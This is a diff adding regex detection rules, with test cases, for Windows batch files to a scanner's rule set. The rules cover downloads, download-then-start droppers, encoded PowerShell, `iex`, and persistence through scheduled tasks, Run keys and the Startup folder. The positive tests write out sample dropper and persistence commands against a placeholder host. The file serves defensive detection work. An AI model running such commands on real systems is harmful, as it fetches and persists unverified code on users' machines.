@@ -722,3 +722,196 @@ rules:
       negative:
         - "ConvertFrom-Json $text"
         - "cat data.json"
+
+  # ---------------------------------------------------------------------
+  # Windows batch (.bat, .cmd)
+  #
+  # What an extension or a package ships to run on Windows. A batch file has no
+  # pipe into an interpreter to speak of: its dropper downloads to a file and
+  # starts the file, two lines apart, and that pair is the one act `curl | sh`
+  # is in shell. `rem` and `::` are not treated as comments: matched mid-line
+  # they would be wrong, and being wrong towards "this is code" costs nothing.
+  # ---------------------------------------------------------------------
+  - id: CAP.BAT.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Opens an outbound network connection
+    message: >
+      This batch file transfers data over the network: curl, wget, bitsadmin,
+      certutil's URL cache, or PowerShell's web cmdlets called from it.
+    remediation: >
+      Confirm the destination is a fixed, known host, and that what is fetched
+      is verified before anything uses it.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        # A transfer tool run as a command, as the shell rule reads `curl`: the address is as
+        # often a variable (`curl -o "%EXE%" "%EXE_URL%"`) as a literal.
+        - '(?i:(?:^|[\s(&|@"])(?:curl|wget)(?:\.exe)?\s)'
+        - '(?i:\bbitsadmin(?:\.exe)?\b[^\n]{0,200}/transfer\b|\bcertutil(?:\.exe)?\b[^\n]{0,200}-urlcache\b)'
+        - '(?i:\b(?:invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|downloadfile|downloadstring|downloaddata)\b)'
+    tests:
+      positive:
+        - 'curl -fsSL -o "%TEMP%\x.exe" https://example.invalid/x.exe'
+        - 'curl -f -s -L -o "%EXE%" "%EXE_URL%"'
+        - 'bitsadmin /transfer job https://example.invalid/x.exe "%TEMP%\x.exe"'
+        - 'powershell -c "(New-Object Net.WebClient).DownloadFile(''https://example.invalid/a'', ''a'')"'
+      negative:
+        - 'echo Installing the theme'
+        - 'set CURL_HOME=%~dp0tools'
+        - 'copy /Y settings.json "%APPDATA%\Code\User\"'
+
+  - id: CAP.BAT.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloads a file and starts it
+    message: >
+      This batch file downloads to a file and, a few lines later, starts an
+      executable or the file a variable names. What runs is whatever the remote
+      host served at that moment; nothing about it is captured by review, by a
+      lockfile, or by any artefact this repository controls.
+    remediation: >
+      Ship the program, or verify the download against a known digest before
+      it is started.
+    languages: [batch]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        # The download, then within about 6,000 characters (a few dozen lines) a `start` (or Start-Process) of an
+        # executable or of a variable -- `start "" /B "%EXE%"`. Not `call`: a
+        # build script that downloads a jar and later calls a site hook is not this.
+        - '(?i:\b(?:curl(?:\.exe)?\b[^\n]{0,300}\s(?:-o|--output)\s|bitsadmin(?:\.exe)?\b[^\n]{0,300}/transfer\b|certutil(?:\.exe)?\b[^\n]{0,300}-urlcache\b|(?:invoke-webrequest|iwr|wget|start-bitstransfer)\b[^\n]{0,300}-(?:outfile|destination)\b|\.downloadfile\s{0,4}\()[\s\S]{0,6000}?\n[^\n]{0,80}(?:^|[\s(&|@])start(?:-process)?\s{1,4}[^\n]{0,60}(?:%\w{1,40}%|\.(?:exe|scr|com|vbs|msi|ps1)\b))'
+    tests:
+      positive:
+        - "set \"EXE=%TEMP%\\a\\a.exe\"\ncurl -f -s -L -o \"%EXE%\" \"%URL%\" 2>nul\nif exist \"%EXE%\" (\nstart \"\" /B \"%EXE%\" >nul 2>&1\n)"
+        - "bitsadmin /transfer j https://example.invalid/p.exe %TEMP%\\p.exe\nstart %TEMP%\\p.exe"
+      negative:
+        - "curl -o node.zip https://example.invalid/node.zip\ntar -xf node.zip\necho done"
+        - "start \"\" \"%~dp0app.exe\""
+        - "curl -o x.jar https://example.invalid/x.jar\ncall mvn package"
+
+  - id: CAP.BAT.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts another process
+    message: >
+      This batch file starts a process beyond its own commands: `start`, a new
+      command interpreter, PowerShell, or one of Windows' script and library
+      hosts.
+    remediation: >
+      No action for this signal alone.
+    languages: [batch]
+    # One benign file, measured without regard to language: the prose "start a" in
+    # corpus/benign/ops/deploy.py. In a scan the rule reads batch files only.
+    baseline_hits: 1
+    match:
+      kind: regex
+      patterns:
+        - '(?i:(?:^|[\s(&|@])start(?:-process)?\s{1,4}["/%\w.\\])'
+        - '(?i:\b(?:cmd|powershell|pwsh)(?:\.exe)?\s{1,4}(?:/[ck]\b|-[a-z]))'
+        - '(?i:\b(?:wscript|cscript|mshta|rundll32|regsvr32)(?:\.exe)?\s)'
+    tests:
+      positive:
+        - 'start "" /B "%EXE%"'
+        - 'powershell -NoProfile -Command "Get-Date"'
+        - 'rundll32 shell32.dll,Control_RunDLL'
+      negative:
+        - 'echo restart the editor when it is done'
+        - 'set START=1'
+
+  - id: CAP.BAT.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Executes a string as code
+    message: >
+      This batch file hands a string to an interpreter as its program: an
+      encoded PowerShell command, `Invoke-Expression`, or a variable's contents
+      run as a command line.
+    remediation: >
+      Run a reviewed script by path instead of a string assembled or decoded at
+      runtime.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]{0,200}\s-(?:e|ec|en|enc|encodedcommand)\s{1,4}[A-Za-z0-9+/=]{16})'
+        - '(?i:\b(?:iex|invoke-expression)\b)'
+        - '(?i:\bcmd(?:\.exe)?\s{1,4}/[ck]\s{1,4}"?%\w{1,40}%"?\s{0,4}$)'
+    tests:
+      positive:
+        - 'powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'
+        - 'powershell -c "iex (gc a.txt -Raw)"'
+        - 'cmd /c %PAYLOAD%'
+      negative:
+        - 'powershell -File build.ps1'
+        - 'cmd /c npm test'
+
+  - id: CAP.BAT.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Installs something that survives a restart
+    message: >
+      This batch file registers something to run again later: a scheduled task,
+      a Run key, a service, or a file in the Startup folder.
+    remediation: >
+      Confirm the user asked for something to run at every sign-in or boot.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\bschtasks(?:\.exe)?\b[^\n]{0,80}/create\b)'
+        - '(?i:\breg(?:\.exe)?\s{1,4}add\b[^\n]{0,200}\\currentversion\\(?:run|runonce)\b)'
+        - '(?i:\bsc(?:\.exe)?\s{1,4}create\b)'
+        - '(?i:\\start menu\\programs\\startup\b)'
+    tests:
+      positive:
+        - 'schtasks /create /tn upd /tr "%EXE%" /sc onlogon'
+        - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v u /d "%EXE%"'
+        - 'copy a.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"'
+      negative:
+        - 'reg query HKLM\Software\Node'
+        - 'schtasks /query'
+
+  - id: CAP.BAT.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands an archive
+    message: >
+      This batch file unpacks an archive: tar, expand, 7-Zip, unzip or
+      PowerShell's Expand-Archive.
+    remediation: >
+      No action for this signal alone.
+    languages: [batch]
+    match:
+      kind: regex
+      patterns:
+        - '(?i:\btar(?:\.exe)?\s{1,4}-?[a-z]{0,4}x)'
+        - '(?i:\b(?:expand-archive|unzip|7z(?:\.exe)?\s{1,4}[xe]\b|expand(?:\.exe)?\s{1,4}\S))'
+    tests:
+      positive:
+        - 'tar -xf node.zip'
+        - 'powershell Expand-Archive a.zip -DestinationPath b'
+        - '7z x payload.7z'
+      negative:
+        - 'tar -cf out.tar build'
+        - 'echo expanded'
